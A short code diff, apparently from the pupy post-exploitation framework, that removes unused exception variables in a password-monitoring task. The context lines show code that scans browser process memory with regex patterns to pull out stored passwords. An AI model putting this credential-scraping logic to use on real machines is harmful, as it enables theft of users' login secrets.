@@ -90,7 +90,7 @@ class PwdMon(pupy.Task):
             if proc.name().lower() in [x.lower() for x in self.browser_list]:
                 try:
                     mw = MemWorker(pid=proc.pid)
-                except ProcessException as e:
+                except ProcessException:
                     continue
 
                 for service, regex in self.mimikittenz_regex:
@@ -101,12 +101,12 @@ class PwdMon(pupy.Task):
                                 for i in x:
                                     try:
                                         passwd = i.read(type="string", maxlen=100, errors='ignore')
-                                    except Exception as e:
+                                    except Exception:
                                         continue
                             else:
                                 try:
                                     passwd = x.read(type="string", maxlen=100, errors='ignore')
-                                except Exception as e:
+                                except Exception:
                                     pass
 
                             if passwd:
